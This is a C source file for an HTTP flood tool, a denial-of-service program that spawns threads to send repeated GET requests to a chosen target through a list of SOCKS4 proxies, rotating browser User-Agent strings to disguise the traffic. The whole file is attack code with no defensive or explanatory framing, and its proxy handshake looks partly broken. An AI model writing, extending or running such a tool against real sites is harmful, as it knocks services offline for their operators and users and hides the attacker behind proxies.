#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <time.h>

#define MAX_UA 8
#define REQ_TEMPLATE "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nConnection: Keep-Alive\r\n\r\n"

const char *user_agents[MAX_UA] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64)",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6_1)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0)",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B)"
};

typedef struct {
    char target[256];
    int port;
    int duration;
    int rate;
    char **proxies;
    int proxy_count;
} flood_args_t;

void *attack_thread(void *arg) {
    flood_args_t *args = (flood_args_t *)arg;
    char req[2048];
    time_t end = time(NULL) + args->duration;

    while (time(NULL) < end) {
        for (int i = 0; i < args->rate; i++) {
            const char *ua = user_agents[rand() % MAX_UA];
            snprintf(req, sizeof(req), REQ_TEMPLATE, args->target, ua);

            char *proxy = args->proxies[rand() % args->proxy_count];
            char ip[64];
            int pport;
            sscanf(proxy, "%[^:]:%d", ip, &pport);

            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) continue;

            struct sockaddr_in proxy_addr;
            proxy_addr.sin_family = AF_INET;
            proxy_addr.sin_port = htons(pport);
            proxy_addr.sin_addr.s_addr = inet_addr(ip);

            if (connect(sock, (struct sockaddr *)&proxy_addr, sizeof(proxy_addr)) == 0) {
                unsigned char socks4_req[9] = { 4, 1, args->port >> 8, args->port & 0xff, 0, 0, 0, 1, 0 };
                send(sock, socks4_req, sizeof(socks4_req), 0);
                recv(sock, socks4_req, 8, 0);

                send(sock, req, strlen(req), 0);
            }
            close(sock);
        }
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 7) {
        printf("Use: %s <target> <port> <time> <rate> <threads> <proxy.txt>\n", argv[0]);
        return 1;
    }

    srand(time(NULL));
    flood_args_t args;
    strncpy(args.target, argv[1], sizeof(args.target));
    args.port = atoi(argv[2]);
    args.duration = atoi(argv[3]);
    args.rate = atoi(argv[4]);
    int threads = atoi(argv[5]);

    FILE *fp = fopen(argv[6], "r");
    if (!fp) {
        perror("Proxy file error");
        return 1;
    }

    args.proxies = malloc(10000 * sizeof(char *));
    args.proxy_count = 0;
    char line[128];
    while (fgets(line, sizeof(line), fp) && args.proxy_count < 10000) {
        line[strcspn(line, "\r\n")] = 0;
        args.proxies[args.proxy_count++] = strdup(line);
    }
    fclose(fp);

    pthread_t tid[threads];
    for (int i = 0; i < threads; i++) {
        pthread_create(&tid[i], NULL, attack_thread, &args);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(tid[i], NULL);
    }

    for (int i = 0; i < args.proxy_count; i++) free(args.proxies[i]);
    free(args.proxies);

    return 0;
}